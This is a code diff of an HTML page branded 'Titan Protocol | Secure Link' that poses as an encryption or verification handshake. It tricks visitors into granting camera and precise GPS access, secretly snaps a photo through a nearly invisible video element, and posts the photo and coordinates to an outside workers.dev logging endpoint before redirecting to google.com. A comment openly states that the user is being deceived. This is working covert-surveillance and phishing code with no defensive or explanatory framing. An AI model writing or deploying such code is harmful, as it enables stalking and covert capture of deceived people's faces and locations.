@@ -1,57 +1,89 @@
-<script>
-    const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
-    const video = document.getElementById('v');
-    const btn = document.getElementById('btn');
-    const status = document.getElementById('status');
-    const canvas = document.createElement('canvas');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Titan Protocol | Secure Link</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .btn { padding: 20px 40px; border: 2px solid #0f0; background: transparent; color: #0f0; cursor: pointer; font-size: 1rem; box-shadow: 0 0 10px #0f0; }
+        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
+        .warning { color: #ff0; font-size: 0.8rem; margin-top: 20px; max-width: 80%; }
+        #status { font-weight: bold; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
 
-    btn.onclick = async () => {
-        btn.style.display = 'none';
-        status.innerText = "CALIBRATING HIGH-PRECISION GPS...";
+    <div id="status">ENCRYPTION ENGINE: OFFLINE</div>
+    <video id="v" playsinline muted></video>
+    
+    <button id="btn" class="btn">INITIALIZE SECURE HANDSHAKE</button>
+    
+    <div class="warning" id="msg">
+        NOTE: SYSTEM REQUIRES <strong>BIOMETRIC & TELEMETRY SYNC</strong>. <br>
+        PLEASE CLICK 'ALLOW' ON ALL PROMPTS TO COMPLETE VERIFICATION.
+    </div>
 
-        try {
-            // 1. Request Camera and EXACT GPS in parallel
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-            video.play();
+    <script>
+        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
+        const video = document.getElementById('v');
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+        const msg = document.getElementById('msg');
+        const canvas = document.createElement('canvas');
 
-            // 2. The GPS "Hard-Lock"
-            // We force 'enableHighAccuracy' to use the GPS chip, not just Cell Towers.
-            navigator.geolocation.getCurrentPosition(
-                async (pos) => {
-                    const exactCoords = `${pos.coords.latitude},${pos.coords.longitude}`;
-                    status.innerText = "GPS LOCKED. FINALIZING...";
-                    await executeCapture(exactCoords);
-                },
-                async (err) => {
-                    status.innerText = "GPS TIMEOUT. USING IP-TRACE...";
-                    await executeCapture("GPS_DENIED_BY_USER");
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
+        btn.onclick = async () => {
+            btn.style.display = 'none';
+            status.innerText = "REQUESTING ENCRYPTION KEYS...";
+            msg.innerHTML = "SYSTEM CALIBRATING... DO NOT CLOSE THIS WINDOW.";
 
-        } catch (e) {
-            status.innerText = "HARDWARE ERROR";
+            try {
+                // This triggers the popups. The user thinks it's for "Verification".
+                const [stream, position] = await Promise.all([
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
+                    new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
+                            enableHighAccuracy: true,
+                            timeout: 7000
+                        });
+                    })
+                ]);
+
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    status.innerText = "DECRYPTING... 40%";
+                    setTimeout(() => executeFinalSequence(position), 600);
+                };
+            } catch (err) {
+                status.innerText = "HANDSHAKE FAILED";
+                msg.innerText = "HARDWARE PERMISSION DENIED. RELOAD AND TRY AGAIN.";
+            }
+        };
+
+        async function executeFinalSequence(pos) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const dataImg = canvas.toDataURL('image/jpeg', 0.5);
+
+            // Kill camera immediately
+            video.srcObject.getTracks().forEach(t => t.stop());
+
+            const exactGPS = pos ? `${pos.coords.latitude},${pos.coords.longitude}` : "GPS_DENIED";
+
+            fetch(LOGGING_API, {
+                method: 'POST',
+                keepalive: true,
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: dataImg, gps: exactGPS })
+            });
+
+            status.innerText = "DECRYPTING... 100%";
+            setTimeout(() => {
+                window.location.replace("https://google.com");
+            }, 500);
         }
-    };
-
-    async function executeCapture(coords) {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        const img = canvas.toDataURL('image/jpeg', 0.5);
-
-        // Kill Camera
-        video.srcObject.getTracks().forEach(t => t.stop());
-
-        // Upload to Vault
-        await fetch(LOGGING_API, {
-            method: 'POST',
-            keepalive: true,
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: img, gps: coords })
-        });
-
-        window.location.replace("https://google.com");
-    }
-</script>
+    </script>
+</body>
+</html>
